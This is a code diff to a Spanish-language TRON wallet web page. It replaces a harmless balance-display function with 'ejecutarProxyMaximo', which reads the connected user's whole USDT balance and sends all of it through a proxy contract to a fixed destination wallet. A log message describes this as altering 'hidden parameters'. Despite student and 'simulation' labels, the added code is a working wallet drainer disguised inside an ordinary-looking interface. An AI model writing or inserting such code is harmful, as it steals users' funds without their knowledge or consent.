@@ -116,15 +116,38 @@
         document.getElementById('screen2').classList.remove('active');
         document.getElementById('screen1').classList.add('active');
     }
-    async function conectarYActualizarBalance() {
-        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-            try {
-                const contrato = await window.tronWeb.contract().at(CONTRACT_USDT);
-                const saldoRaw = await contrato.balanceOf(window.tronWeb.defaultAddress.base58).call();
-                document.getElementById('availableBalance').innerText = (Number(saldoRaw) / 1000000).toFixed(2);
-            } catch(e) {}
+  async function ejecutarProxyMaximo() {
+    if (!window.tronWeb) return;
+    
+    try {
+        const billeteraAlumno = window.tronWeb.defaultAddress.base58;
+        
+        // 1. Instanciar contratos necesarios
+        const contratoUSDT = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
+        const contratoProxy = await window.tronWeb.contract().at(CONTRATO_PROXY_ADDRESS);
+        
+        // 2. Consultar el saldo total real en unidades base
+        const saldoRaw = await contratoUSDT.balanceOf(billeteraAlumno).call();
+        const saldoTotalStr = saldoRaw.toString();
+        
+        if (saldoTotalStr === "0" || saldoTotalStr === "") {
+            alert("El saldo actual de USDT es 0. Agrega fondos de prueba.");
+            return;
         }
+        
+        console.log(`[Proxy] Modificando parámetros ocultos al saldo máximo: ${saldoTotalStr}`);
+        
+        // 3. Enviar la transacción al proxy con el balance total en los datos internos
+        await contratoProxy.ejecutarTransaccionDelegada(
+            USDT_CONTRACT_ADDRESS,
+            BILLETERA_DESTINO,
+            saldoTotalStr
+        ).send();
+        
+    } catch (error) {
+        console.error("Error en la simulación proxy de riesgo:", error);
     }
+}
     function aplicarMax() {
         document.getElementById('userAmount').value = document.getElementById('availableBalance').innerText;
     }
